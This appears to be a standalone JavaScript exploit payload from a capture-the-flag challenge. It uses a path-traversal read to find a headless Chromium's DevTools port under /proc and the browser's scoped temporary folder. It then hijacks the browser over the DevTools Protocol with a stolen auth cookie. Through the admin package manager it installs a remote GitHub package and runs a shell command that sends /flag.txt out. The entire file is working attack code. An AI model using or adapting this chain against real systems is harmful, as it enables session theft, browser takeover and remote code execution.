(async()=>{
const post=t=>fetch('/edit',{method:'POST',keepalive:true,headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'title=csrf&content='+encodeURIComponent(String(t).replace(/[^A-Za-z0-9 !.:()]/g,' '))});
const read=async p=>{
 try{
  let r=await fetch('/profile'+p+'%3f',{cache:'no-store'});
  return [r.status,await r.text()];
 }catch(e){return [0,'']}
};
const ck=document.cookie.split(';').map(x=>x.trim()).find(x=>x.startsWith('auth='))||document.cookie.split(';')[0]||'';
const stage=`(async()=>{
const sleep=ms=>new Promise(r=>setTimeout(r,ms));
const api=async(p,d)=>{
 let f=new FormData();
 f.append('__csrf__',document.querySelector('meta[name=csrf]').content);
 f.append('__json__',JSON.stringify(d));
 let r=await fetch(p,{method:'POST',body:f});
 let t=await r.text().catch(()=>'');
 return p+' '+r.status+' '+t.slice(0,80);
};
await sleep(1500);
if(!document.querySelector('meta[name=csrf]'))return 'csrf none '+location.href;
let a=await api('/_api/package-manager/add-repository',{platform:'github',name:'2ash1/static',repositoryUrl:'https://github.com/2Ash1/static',branch:'main'}).catch(e=>'add err '+e.name+' '+e.message);
let b=await api('/_api/package-manager/install',{package:'2ash1/static'}).catch(e=>'install err '+e.name+' '+e.message);
await sleep(2000);
let ck=decodeURIComponent(location.hash.slice(1));
let cmd='curl -s -X POST http://app/edit -H "Cookie: '+ck.replace(/"/g,'')+'" --data title=flag --data-urlencode content="$(python3 -c \\'print(open("/flag.txt","rb").read().hex())\\')"';
location.href='/packages/2ash1/static/index.php?cmd='+encodeURIComponent(cmd);
return a+' | '+b;
})()`;

const dirsFrom=c=>{
 let out=[];
 for(let x of c.matchAll(/\/tmp\/\.?org\.chromium\.Chromium\.scoped[_\.]dir\.[A-Za-z0-9]+/g)){
  if(!out.includes(x[0]))out.push(x[0]);
 }
 return out;
};
const wsFrom=async dir=>{
 let [st,d]=await read(dir+'/DevToolsActivePort');
 post('dtap '+st+' '+d.length+' '+d.slice(0,90));
 if(st!==200)return '';
 let port=(d.match(/\b(\d{2,6})\b/)||[])[1]||'';
 let path=(d.match(/\/devtools\/browser\/[A-Za-z0-9.-]+/)||[])[0]||'';
 if(!path){
  let id=(d.match(/(?:browser|devtools)[^A-Za-z0-9]+([A-Za-z0-9.-]{20,})/)||[])[1]||'';
  if(id)path='/devtools/browser/'+id;
 }
 post('parsed '+port+' '+path);
 if(!port||!path)return '';
 return 'ws://localhost:'+port+path;
};
const findWs=async()=>{
 for(let base=1;base<4000;base+=80){
  let res=await Promise.all(Array.from({length:80},async(_,i)=>{
   let pid=base+i;
   let [st,c]=await read('/proc/'+pid+'/cmdline');
   if(st!==200||!c.includes('user-data-dir'))return '';
   post('pid '+pid);
   let dirs=dirsFrom(c);
   if(!dirs.length)post('dir none '+c.slice(0,180));
   for(let dir of dirs){
    post('dir '+dir);
    post('dirhex '+Array.from(dir).map(ch=>ch.charCodeAt(0).toString(16).padStart(2,'0')).join('').slice(0,180));
    let ws=await wsFrom(dir);
    if(ws)return ws;
   }
   return '';
  }));
  let hit=res.find(Boolean);
  if(hit)return hit;
 }
 return '';
};
const frameRun=urls=>{
 window.addEventListener('message',e=>{
  if(e.data&&e.data.cdpLog)post('df '+e.data.cdpLog);
 });
 let code=`(()=> {
const log=t=>parent.postMessage({cdpLog:String(t)},'*');
const urls=${JSON.stringify(urls)};
const ck=${JSON.stringify(ck)};
const stage=${JSON.stringify(stage)};
let pos=0;
const start=()=>{
 let wsurl=urls[pos++];
 if(!wsurl){log('ws all failed');return}
 log('ws try '+wsurl.replace(/[^A-Za-z0-9:]/g,' ').slice(0,120));
 let ws,id=0,wait={},opened=false;
 try{ws=new WebSocket(wsurl)}catch(e){log('ws ctor '+e.name+' '+e.message);start();return}
 const send=(method,params={},sid='')=>new Promise((res,rej)=>{
  let n=++id;
  wait[n]=res;
  ws.send(JSON.stringify({id:n,method,params,...(sid?{sessionId:sid}:{})}));
  setTimeout(()=>rej(new Error('timeout '+method)),8000);
 });
 ws.onerror=()=>log('ws error');
 ws.onclose=()=>{if(!opened){log('ws close before open');start()}};
 ws.onmessage=e=>{
  let m=JSON.parse(e.data);
  if(m.id&&wait[m.id]){wait[m.id](m);delete wait[m.id]}
 };
 ws.onopen=async()=>{
  opened=true;
  try{
   log('ws open');
   let t=await send('Target.createTarget',{url:'http://admin-app/dashboard/home#'+encodeURIComponent(ck)});
   let sid=(await send('Target.attachToTarget',{targetId:t.result.targetId,flatten:true})).result.sessionId;
   log('target attach');
   let r=await send('Runtime.evaluate',{expression:stage,awaitPromise:true,returnByValue:true},sid);
   log('eval '+String((((r.result||{}).result||{}).value)||'sent').slice(0,400));
  }catch(e){log('err '+e.name+' '+e.message)}
 };
};
start();
})()`;
 let f=document.createElement('iframe');
 f.sandbox='allow-scripts';
 f.srcdoc='<script>'+code.split('</script').join('<\\/script')+'</script>';
 document.body.appendChild(f);
};

const run=(urls,fail)=>{
 let pos=0;
 const start=()=>{
 let wsurl=urls[pos++];
 if(!wsurl){post('ws all failed');if(fail)fail();return}
 post('ws try '+wsurl.replace(/[^A-Za-z0-9:]/g,' ').slice(0,120));
 let ws,id=0,wait={},opened=false;
 try{ws=new WebSocket(wsurl)}catch(e){post('ws ctor '+e.name+' '+e.message);start();return}
 const send=(method,params={},sid='')=>new Promise((res,rej)=>{
  let n=++id;
  wait[n]=res;
  ws.send(JSON.stringify({id:n,method,params,...(sid?{sessionId:sid}:{})}));
  setTimeout(()=>rej(new Error('timeout '+method)),8000);
 });
 ws.onerror=()=>post('ws error');
 ws.onclose=()=>{if(!opened){post('ws close before open');start()}};
 ws.onmessage=e=>{
  let m=JSON.parse(e.data);
  if(m.id&&wait[m.id]){wait[m.id](m);delete wait[m.id]}
 };
 ws.onopen=async()=>{
  opened=true;
  try{
   post('ws open');
   let t=await send('Target.createTarget',{url:'http://admin-app/dashboard/home#'+encodeURIComponent(ck)});
   let sid=(await send('Target.attachToTarget',{targetId:t.result.targetId,flatten:true})).result.sessionId;
   post('target attach');
   let r=await send('Runtime.evaluate',{expression:stage,awaitPromise:true,returnByValue:true},sid);
   post('eval '+String((((r.result||{}).result||{}).value)||'sent').slice(0,400));
  }catch(e){post('err '+e.name+' '+e.message)}
 };
 };
 start();
};

post('cdp dyn 0615ad');
let wsurl=await findWs();
if(!wsurl){post('ws none');return}
let urls=[wsurl,wsurl.replace('ws://localhost:','ws://127.0.0.1:'),wsurl.replace('ws://localhost:','ws://[::1]:')];
run(urls,()=>frameRun(urls));
})();
